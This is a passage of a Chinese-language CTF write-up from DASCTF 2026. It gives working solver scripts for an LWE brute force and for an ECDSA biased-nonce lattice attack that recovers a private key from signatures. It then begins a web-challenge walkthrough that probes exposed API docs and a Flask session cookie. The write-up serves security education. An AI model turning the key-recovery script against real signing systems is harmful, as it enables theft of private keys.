class="hljs-number">92</span>, <span class="hljs-number">33</span>, <span class="hljs-number">64</span>, <span class="hljs-number">22</span>, <span class="hljs-number">64</span>, <span class="hljs-number">13</span>], [<span class="hljs-number">38</span>, <span class="hljs-number">81</span>, <span class="hljs-number">64</span>, <span class="hljs-number">77</span>, <span class="hljs-number">25</span>, <span class="hljs-number">19</span>], [<span class="hljs-number">20</span>, <span class="hljs-number">69</span>, <span class="hljs-number">67</span>, <span class="hljs-number">0</span>, <span class="hljs-number">76</span>, <span class="hljs-number">41</span>],<br>     [<span class="hljs-number">2</span>, <span class="hljs-number">14</span>, <span class="hljs-number">46</span>, <span class="hljs-number">39</span>, <span class="hljs-number">30</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">72</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">93</span>, <span class="hljs-number">62</span>, <span class="hljs-number">8</span>], [<span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-number">84</span>, <span class="hljs-number">60</span>, <span class="hljs-number">70</span>, <span class="hljs-number">21</span>]]<br>b = [<span class="hljs-number">56</span>, <span class="hljs-number">74</span>, <span class="hljs-number">51</span>, <span class="hljs-number">28</span>, <span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">34</span>, <span class="hljs-number">45</span>, <span class="hljs-number">82</span>, <span class="hljs-number">56</span>, <span class="hljs-number">62</span>, <span class="hljs-number">52</span>, <span class="hljs-number">5</span>, <span class="hljs-number">71</span>, <span class="hljs-number">35</span>, <span class="hljs-number">41</span>, <span class="hljs-number">86</span>, <span class="hljs-number">47</span>, <span class="hljs-number">8</span>, <span class="hljs-number">27</span>,<br>     <span class="hljs-number">64</span>, <span class="hljs-number">29</span>, <span class="hljs-number">57</span>, <span class="hljs-number">92</span>, <span class="hljs-number">34</span>, <span class="hljs-number">55</span>, <span class="hljs-number">57</span>, <span class="hljs-number">70</span>, <span class="hljs-number">87</span>, <span class="hljs-number">28</span>]<br>iv = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;bcdad772f7a0ec967887f7b8f36234c8&#x27;</span>)<br>enc = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;00ac1bac207e84d91c6243c4aead3576a20f996a5420eea7bfa0df3b61d68c83f283bd31f1fedf7465b6445d7a58dcdc&#x27;</span>)<br><br><span class="hljs-comment"># 暴力枚举 s[0..5] ∈ &#123;0,1,2,3&#125;</span><br><span class="hljs-keyword">for</span> s0 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-keyword">for</span> s1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> s2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">for</span> s3 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                <span class="hljs-keyword">for</span> s4 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                    <span class="hljs-keyword">for</span> s5 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                        s = [s0, s1, s2, s3, s4, s5]<br>                        valid = <span class="hljs-literal">True</span><br>                        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>                            dot = <span class="hljs-built_in">sum</span>(A[i][j] * s[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n))<br>                            e = (b[i] - dot) % q<br>                            <span class="hljs-keyword">if</span> e <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, q - <span class="hljs-number">1</span>):<br>                                valid = <span class="hljs-literal">False</span><br>                                <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">if</span> valid:<br>                            key = hashlib.sha256(<span class="hljs-built_in">str</span>(s).encode()).digest()[:<span class="hljs-number">16</span>]<br>                            flag = AES.new(key, AES.MODE_CBC, iv).decrypt(enc)<br>                            pad_len = flag[-<span class="hljs-number">1</span>]<br>                            flag = flag[:-pad_len]<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;s = <span class="hljs-subst">&#123;s&#125;</span>&quot;</span>)<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br>                            exit()<br></code></pre></td></tr></table></figure>
+
+<h4 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h4><ul>
+<li>LWE 参数（<code>n=6</code>, <code>q=97</code>, 误差范围 <code>&#123;-1,0,1&#125;</code>）过小，暴力搜索空间仅 <img src="https://cdn.nlark.com/yuque/__latex/17b77e50d9e136f166f267f4af649cb9.svg" srcset="/img/loading.gif" lazyload alt="image"></li>
+<li>实际 CTF 中的 LWE 问题通常需要格基归约（LLL/BKZ），但本题参数故意设小以降低难度</li>
+<li>AES 密钥由 <code>sha256(str(s))</code> 派生，注意 Python 的 <code>str(list)</code> 格式</li>
+</ul>
+<h3 id="phantom-sign"><a href="#phantom-sign" class="headerlink" title="phantom_sign"></a>phantom_sign</h3><p>Flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">DASCTF&#123;3cd5a_b1as3d_n0nc3_HNP_l4tt1c3_4ttack!&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目实现了 ECDSA 签名（secp256k1 曲线），使用 40 条已知消息的签名。关键弱点在于 nonce 的生成方式：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">k_i = bytes_to_long(os.urandom(<span class="hljs-number">31</span>))  <span class="hljs-comment"># 31 字节 = 248 位</span><br></code></pre></td></tr></table></figure>
+
+<p>而曲线阶 <code>n</code> 为 256 位。这意味着 <code>k_i &lt; 2^248</code>，即 nonce 比 <code>n</code> 少 8 位（高位为 0）。这是一个典型的 <strong>biased nonce</strong> 攻击场景。</p>
+<h4 id="ECDSA-签名方程"><a href="#ECDSA-签名方程" class="headerlink" title="ECDSA 签名方程"></a>ECDSA 签名方程</h4><p><img src="https://cdn.nlark.com/yuque/__latex/b8d5ef0fdc0f66957e60f33487fde336.svg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>可改写为：</p>
+<p><img src="https://cdn.nlark.com/yuque/__latex/740e409c3b4dcfe6fb596a6ffe8b5662.svg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>其中 <img src="https://cdn.nlark.com/yuque/__latex/a60d0735947d1ecd21ec53a12aa9a511.svg" srcset="/img/loading.gif" lazyload alt="image">，<img src="https://cdn.nlark.com/yuque/__latex/ae33cb1df5cac38b604900455d6b0f36.svg" srcset="/img/loading.gif" lazyload alt="image">。</p>
+<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><h4 id="Hidden-Number-Problem-HNP"><a href="#Hidden-Number-Problem-HNP" class="headerlink" title="Hidden Number Problem (HNP)"></a>Hidden Number Problem (HNP)</h4><p>由于 <img src="https://cdn.nlark.com/yuque/__latex/5a4a8a6ed93d9803404ba5a208c7eba6.svg" srcset="/img/loading.gif" lazyload alt="image">（比 <img src="https://cdn.nlark.com/yuque/__latex/df378375e7693bdcf9535661c023c02e.svg" srcset="/img/loading.gif" lazyload alt="image"> 少 8 位），上述方程构成一个 Hidden Number Problem。给定足够多的 <img src="https://cdn.nlark.com/yuque/__latex/db4d59ae50d7c70d3871acfadb18d755.svg" srcset="/img/loading.gif" lazyload alt="image"> 对和有界 <img src="https://cdn.nlark.com/yuque/__latex/79b1e218b789236f15ef57584bd18cf5.svg" srcset="/img/loading.gif" lazyload alt="image">，可以通过格基归约找到秘密 <img src="https://cdn.nlark.com/yuque/__latex/56c1b0cb7a48ccf9520b0adb3c8cb2e8.svg" srcset="/img/loading.gif" lazyload alt="image">。</p>
+<h4 id="Kannan-嵌入法"><a href="#Kannan-嵌入法" class="headerlink" title="Kannan 嵌入法"></a>Kannan 嵌入法</h4><p>将 CVP（最近向量问题）转化为 SVP（最短向量问题）：</p>
+<ol>
+<li>构造格 <img src="https://cdn.nlark.com/yuque/__latex/c895173d3be4872abf206be4268a58cb.svg" srcset="/img/loading.gif" lazyload alt="image">，基向量为 <img src="https://cdn.nlark.com/yuque/__latex/f265be1179f1d502c81a94d1acb0a281.svg" srcset="/img/loading.gif" lazyload alt="image"> 和 <img src="https://cdn.nlark.com/yuque/__latex/4a15117f8840caeef629c6efe83cd7a1.svg" srcset="/img/loading.gif" lazyload alt="image"></li>
+<li>目标向量为 <img src="https://cdn.nlark.com/yuque/__latex/548cb26f3b8cd74047fe3903c71d9911.svg" srcset="/img/loading.gif" lazyload alt="image"></li>
+<li>使用 Kannan 嵌入，添加目标行 <img src="https://cdn.nlark.com/yuque/__latex/eb59f1784b56d345359961c30cca6a58.svg" srcset="/img/loading.gif" lazyload alt="image"> 其中 <img src="https://cdn.nlark.com/yuque/__latex/9eb759c09de0815e4fa40bc1f6554395.svg" srcset="/img/loading.gif" lazyload alt="image"></li>
+<li>LLL 归约后的最短向量即为 <img src="https://cdn.nlark.com/yuque/__latex/8fb9aa888ede4d2aff8df32be0cbd3bf.svg" srcset="/img/loading.gif" lazyload alt="image"></li>
+</ol>
+<h4 id="参数分析"><a href="#参数分析" class="headerlink" title="参数分析"></a>参数分析</h4><ul>
+<li>格维度：<img src="https://cdn.nlark.com/yuque/__latex/dc668e4d52cf69dc8d6677d46b457ad9.svg" srcset="/img/loading.gif" lazyload alt="image">（40 条签名 + 1 个 Kannan 嵌入列）</li>
+<li>目标向量范数：<img src="https://cdn.nlark.com/yuque/__latex/fbd0a6bfddcb80d9c5fe08fc4c4fb4f3.svg" srcset="/img/loading.gif" lazyload alt="image"></li>
+<li>高斯启发式：<img src="https://cdn.nlark.com/yuque/__latex/ce3019ffe094dd6271885256c0b0b459.svg" srcset="/img/loading.gif" lazyload alt="image"></li>
+<li>目标范数 <img src="https://cdn.nlark.com/yuque/__latex/b87101e34279ae8a2c60bd9080f20799.svg" srcset="/img/loading.gif" lazyload alt="image"> 高斯启发式，LLL 可以找到</li>
+</ul>
+<h4 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h4><p>需要 <code>pycryptodome</code> 和 <code>python-flint</code> 库</p>
+<p>解题脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json, hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> flint<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.json&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = json.load(f)<br><br>n = data[<span class="hljs-string">&quot;curve&quot;</span>][<span class="hljs-string">&quot;n&quot;</span>]<br>signatures = data[<span class="hljs-string">&quot;signatures&quot;</span>]<br>iv = <span class="hljs-built_in">bytes</span>.fromhex(data[<span class="hljs-string">&quot;iv&quot;</span>])<br>enc = <span class="hljs-built_in">bytes</span>.fromhex(data[<span class="hljs-string">&quot;enc&quot;</span>])<br>B = <span class="hljs-number">2</span>**<span class="hljs-number">248</span><br><br><span class="hljs-comment"># 预计算 beta_i 和 t_i</span><br>betas, ts = [], []<br><span class="hljs-keyword">for</span> h, r, s <span class="hljs-keyword">in</span> signatures:<br>    s_inv = <span class="hljs-built_in">pow</span>(s, -<span class="hljs-number">1</span>, n)<br>    betas.append(s_inv * r % n)<br>    ts.append(s_inv * h % n)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_decrypt</span>(<span class="hljs-params">d_cand</span>):<br>    <span class="hljs-keyword">if</span> d_cand &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> d_cand &gt;= n: <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    key = hashlib.sha256(long_to_bytes(d_cand)).digest()[:<span class="hljs-number">16</span>]<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">try</span>:<br>        flag = unpad(cipher.decrypt(enc), <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;DASCTF&quot;</span> <span class="hljs-keyword">in</span> flag: <span class="hljs-keyword">return</span> flag.decode()<br>    <span class="hljs-keyword">except</span>: <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_d</span>(<span class="hljs-params">d_val</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(signatures)):<br>        h, r, s = signatures[i]<br>        k = (h + d_val * r) * <span class="hljs-built_in">pow</span>(s, -<span class="hljs-number">1</span>, n) % n<br>        <span class="hljs-keyword">if</span> k &gt;= B: <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-comment"># Kannan 嵌入格</span><br>m = <span class="hljs-built_in">len</span>(signatures)<br>dim = m + <span class="hljs-number">1</span><br>M_param = B<br><br>rows = []<br>rows.append([<span class="hljs-built_in">int</span>(betas[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m)] + [<span class="hljs-number">0</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    row = [<span class="hljs-number">0</span>] * dim<br>    row[i] = n<br>    rows.append(row)<br>rows.append([<span class="hljs-built_in">int</span>(ts[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m)] + [<span class="hljs-built_in">int</span>(M_param)])<br><br>M_mat = flint.fmpz_mat(rows)<br>M_reduced = M_mat.lll()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(rows)):<br>    vec = [<span class="hljs-built_in">int</span>(M_reduced[i, j]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(dim)]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(vec[-<span class="hljs-number">1</span>]) != M_param: <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">max</span>(<span class="hljs-built_in">abs</span>(k) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> vec[:-<span class="hljs-number">1</span>]) &gt;= <span class="hljs-number">2</span> * B: <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>        kj = vec[j]<br>        <span class="hljs-keyword">for</span> kj_cand <span class="hljs-keyword">in</span> [kj % n, (-kj) % n]:<br>            d = ((kj_cand - ts[j]) * <span class="hljs-built_in">pow</span>(betas[j], -<span class="hljs-number">1</span>, n)) % n<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt; d &lt; n <span class="hljs-keyword">and</span> verify_d(d):<br>                result = try_decrypt(d)<br>                <span class="hljs-keyword">if</span> result:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;d = <span class="hljs-subst">&#123;d&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                    exit()<br></code></pre></td></tr></table></figure>
+
+<h4 id="关键点-1"><a href="#关键点-1" class="headerlink" title="关键点"></a>关键点</h4><ul>
+<li><code>os.urandom(31)</code> 生成的 nonce 为 248 位，比曲线阶 <code>n</code>（256 位）少 8 位</li>
+<li>这 8 位的 bias 足以通过 Hidden Number Problem + 格基归约恢复私钥</li>
+<li>40 条签名提供了足够的方程数（需要约 33+ 条）</li>
+<li>使用 Kannan 嵌入将 CVP 转化为 SVP，用 flint 的快速 LLL 求解</li>
+<li>核心公式：<img src="https://cdn.nlark.com/yuque/__latex/740e409c3b4dcfe6fb596a6ffe8b5662.svg" srcset="/img/loading.gif" lazyload alt="image">，其中 <img src="https://cdn.nlark.com/yuque/__latex/5a4a8a6ed93d9803404ba5a208c7eba6.svg" srcset="/img/loading.gif" lazyload alt="image"></li>
+</ul>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="InkVerse"><a href="#InkVerse" class="headerlink" title="InkVerse"></a>InkVerse</h3><p>题目描述</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">InkVerse是一个功能丰富的社区博客平台，支持文章发布、赞赏打赏、内容审核、文章导出以及每周摘要报告等功能。平台最近完成了一次大规模架构升级，引入了后台任务队列和分级公告系统。作为受邀的安全顾问，你的任务是对该系统进行全面评估。试试 /api/docs<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://ca62fb0b.http-ctf2.dasctf.com/api/docs">http://ca62fb0b.http-ctf2.dasctf.com/api/docs</a>暴露了接口文档</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;endpoints&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;POST /api/admin/promote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Promote user (admin only)&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /api/articles/import&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Import articles (admin only)&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;GET /logout&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Logout current session&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /login&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Login (form: username, password)&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /register&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Register a new account (form: username, password)&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;blog&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;GET /&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;List published articles&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;GET /api/user/info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Get current user info&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;GET /article/&lt;id&gt;&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;View article&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;GET /dashboard&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;User dashboard with stats&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /api/tip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Tip an article author (json: article_id)&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /article/&lt;id&gt;/delete&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Delete own article&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /article/&lt;id&gt;/edit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Edit draft/rejected article&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /article/&lt;id&gt;/submit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Submit article for review&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /article/new&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Create new article (form: title, content)&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;bulletin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;GET /bulletin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;View bulletin board&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /api/bulletin/refresh&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Invalidate cached bulletin data&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;digest&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;GET /digests/&lt;filename&gt;&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Download digest file&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /api/digest/subscribe&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Subscribe to digest (json: digest_type, include_private)&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;export&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;GET /api/export/status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;List export jobs and their status&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;GET /exports/&lt;filename&gt;&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Download completed export file&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /api/export&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Create export job for published article (json: article_id)&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;invite&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;POST /api/invite/create&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Create invite code (json: target_role)&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /api/invite/use&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Use invite code (json: code)&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;review&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;GET /api/review/feature/status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Check feature request status (query: article_id)&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;GET /review&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Review panel (reviewer/admin only)&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /api/review/batch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Batch review articles (json: article_ids[], action)&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /api/review/feature&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Request article featuring (json: article_id, signature)&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;POST /api/review/single&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Review single article (json: article_id, action)&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;platform&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;InkVerse Blog Platform&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2.1.0&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>注册账户test/test</p>
+<p><img src="/mdimg/2026DASCTF/1780205034594-40196f98-aa4a-414d-91df-13c6a00de335.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问<code>/bulletin</code>提示<code>Access denied. Only featured article authors, reviewers, and admins can view the bulletin board.</code></p>
+<p>Reputation达到50权限提升至Reviewer</p>
+<p>通过打赏文章可以获取Reputation，打赏消耗Balance</p>
+<p><img src="/mdimg/2026DASCTF/1780205349695-990c4b9c-ea51-42fb-a066-070bcda3a329.png" srcset="/img/loading.gif" lazyload></p>
+<p>10 Balance == 2 Reputation</p>
+<p>200/10=20*2=40 Reputation，不够50提升到Reviewer</p>
+<p>看cookie格式可以知道是Flask session cookie 格式：<code>base64_payload.timestamp.hmac_signature</code></p>
